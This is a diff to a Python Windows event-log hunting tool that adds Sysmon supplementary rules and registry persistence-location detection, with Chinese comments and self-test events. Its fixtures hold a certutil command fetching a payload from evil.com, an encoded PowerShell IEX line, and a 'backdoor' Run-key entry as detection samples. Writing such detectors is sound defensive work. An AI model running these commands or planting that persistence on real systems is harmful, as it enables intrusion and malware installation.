@@ -129,6 +129,7 @@ RULE_SEVERITY = {
     "R-WIN-013": "P1", "R-WIN-014": "P2", "R-WIN-015": "P0", "R-WIN-016": "P1",
     "R-WIN-017": "P1", "R-WIN-018": "P0", "R-WIN-019": "P1", "R-WIN-020": "P0",
     "R-WIN-021": "P1", "R-WIN-022": "P0",
+    "R-WIN-023": "P2", "R-WIN-024": "P1",
 }
 
 RULE_CATEGORY = {
@@ -143,6 +144,7 @@ RULE_CATEGORY = {
     "R-WIN-017": "rce",         "R-WIN-018": "rce",
     "R-WIN-019": "rce",         "R-WIN-020": "lateral",
     "R-WIN-021": "其他",         "R-WIN-022": "lateral",
+    "R-WIN-023": "其他",         "R-WIN-024": "lateral",
 }
 
 RULE_FP_PROB = {
@@ -151,7 +153,7 @@ RULE_FP_PROB = {
     "R-WIN-009": 0.20, "R-WIN-010": 0.05, "R-WIN-011": 0.05, "R-WIN-012": 0.25,
     "R-WIN-013": 0.15, "R-WIN-014": 0.20, "R-WIN-015": 0.05, "R-WIN-016": 0.20,
     "R-WIN-017": 0.10, "R-WIN-018": 0.05, "R-WIN-019": 0.10, "R-WIN-020": 0.15,
-    "R-WIN-021": 0.30, "R-WIN-022": 0.15,
+    "R-WIN-021": 0.30, "R-WIN-022": 0.15, "R-WIN-023": 0.25, "R-WIN-024": 0.20,
 }
 
 RULE_ACTION = {
@@ -177,6 +179,8 @@ RULE_ACTION = {
     "R-WIN-020": "P0：核查源进程是否白名单；抓源进程完整命令行与父进程；疑似 mimikatz / procdump 立即隔离主机",
     "R-WIN-021": "确认落地文件哈希 / 签名 / 落地时间；结合父进程判定攻击链",
     "R-WIN-022": "P0 WMI 持久化：读取 EventFilter Query + EventConsumer CommandLineTemplate；未授权立即删除并保留证据",
+    "R-WIN-023": "Sysmon 补充规则命中：核查命中字段值与规则 id；结合父进程/命令行判定是否恶意；保留证据转 ir",
+    "R-WIN-024": "持久化位置命中：核查该注册表/文件位置是否运维合法变更；护网期默认高危，未授权立即回滚并审计",
 }
 
 # ---- utility -----------------------------------------------------------------
@@ -422,6 +426,18 @@ def detect(records: Iterable[dict],
         except re.error:
             continue
 
+    # persistence location patterns compiled (R-WIN-024): location 字段按 contains 匹配
+    # TargetObject（registry）或 TargetFilename（file），detection_type 仅做元数据透传。
+    persist_compiled: list[tuple[dict, re.Pattern]] = []
+    for p in (persistence_rules or []):
+        loc = p.get("location") or ""
+        if not loc:
+            continue
+        try:
+            persist_compiled.append((p, re.compile(re.escape(loc), re.IGNORECASE)))
+        except re.error:
+            continue
+
     for rec in records:
         eid  = rec.get("event_id") or 0
         ch   = rec.get("channel") or ""
@@ -589,11 +605,37 @@ def detect(records: Iterable[dict],
                 fld = r.get("field") or "CommandLine"
                 val = str(data.get(fld) or "")
                 if val and pat.search(val):
-                    # attach as an extra evidence hint on R-WIN-021 stream — but avoid duplicating
-                    # to keep the top-level rule count clean, we tag it as R-WIN-022 for wmi triad
-                    # and skip re-emitting for events we already covered above
-                    if r.get("id") in {"SIG-SYSMON-001"}:  # example gate
-                        pass  # already handled by hardcoded rules; adjust if you want to fire
+                    # 跳过已被硬编码规则覆盖的 SIG-SYSMON-001（PowerShell -enc 已由 4104 路径处理），
+                    # 其余命中 emit R-WIN-023（sysmon 补充规则）。
+                    if r.get("id") in {"SIG-SYSMON-001"}:
+                        continue
+                    sev_map = {"high": "P1", "medium": "P2", "low": "P3"}
+                    emit(findings, "R-WIN-023", rec, {
+                        "sig_id": r.get("id"),
+                        "field": fld,
+                        "matched": val[:160],
+                        "sig_severity": r.get("severity"),
+                        "description": r.get("description"),
+                    })
+                    # 按 Sigma 规则自身的 severity 覆盖默认 P2（emit_finding 已写入，此处修正）
+                    if r.get("severity") in sev_map:
+                        findings[-1]["severity"] = sev_map[r["severity"]]
+
+            # persistence patterns from data/windows-persistence-patterns.json (R-WIN-024)
+            # Sysmon EID 12 (registry add) / 13 (registry set) / 11 (file create) 承载持久化位置
+            if eid in (11, 12, 13):
+                target = str(data.get("TargetObject") or data.get("TargetFilename") or "")
+                if target:
+                    for p, loc_pat in persist_compiled:
+                        if loc_pat.search(target):
+                            emit(findings, "R-WIN-024", rec, {
+                                "persist_id": p.get("id"),
+                                "category": p.get("category"),
+                                "detection_type": p.get("detection_type"),
+                                "location": p.get("location"),
+                                "matched_target": target[:200],
+                            })
+                            break  # 同一目标命中一条持久化规则即可，避免重复 emit
 
     return findings
 
@@ -631,15 +673,43 @@ SELF_TEST_EVENTS: list[dict] = [
      "channel": "Microsoft-Windows-PowerShell/Operational", "event_id": 4104,
      "record_id": 600, "message": "",
      "data": {"ScriptBlockText": "IEX ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('...')))"}},
+    # R-WIN-023: Sysmon EID 1 命中补充规则（certutil 下载，命中 SIG-SYSMON-TEST certutil pattern）
+    {"ts": "2026-07-01T10:06:00+00:00",
+     "channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1,
+     "record_id": 700, "message": "process create",
+     "data": {"CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe",
+              "Image": "C:\\Windows\\System32\\certutil.exe"}},
+    # R-WIN-024: Sysmon EID 13 命中持久化位置（HKLM Run key 新增值）
+    {"ts": "2026-07-01T10:07:00+00:00",
+     "channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 13,
+     "record_id": 800, "message": "registry set",
+     "data": {"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\backdoor",
+              "Details": "C:\\Temp\\backdoor.exe"}},
+]
+
+
+# self-test 用的补充规则集（模拟 Sigma 转换产出的 sysmon 规则 + persistence 位置）
+SELF_TEST_SYSMON_RULES = [
+    {"id": "SIG-SYSMON-TEST", "event_id": 1, "field": "CommandLine",
+     "pattern": r"(?i)certutil\.exe\s+.*-urlcache", "severity": "high",
+     "description": "certutil remote download (lolbin)", "false_positive": "rare legit admin use"},
+]
+SELF_TEST_PERSIST_RULES = [
+    {"id": "SIG-WIN-001", "category": "run-key", "detection_type": "registry_value_new",
+     "location": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+     "severity": "high", "description": "Run key persistence",
+     "false_positive": "legit installers"},
 ]
 
 
 def run_self_test() -> int:
     print("[*] evtx_hunt.py self-test start", file=sys.stderr)
     recs = [normalize_record(e) for e in SELF_TEST_EVENTS]
-    findings = detect(recs)
+    findings = detect(recs, sysmon_rules=SELF_TEST_SYSMON_RULES,
+                      persistence_rules=SELF_TEST_PERSIST_RULES)
     hit_ids = {f["rule_id"] for f in findings}
-    expected = {"R-WIN-001", "R-WIN-002", "R-WIN-004", "R-WIN-007", "R-WIN-010", "R-WIN-017"}
+    expected = {"R-WIN-001", "R-WIN-002", "R-WIN-004", "R-WIN-007", "R-WIN-010",
+                "R-WIN-017", "R-WIN-023", "R-WIN-024"}
     missing = expected - hit_ids
     extra   = hit_ids - expected
     for f in findings:
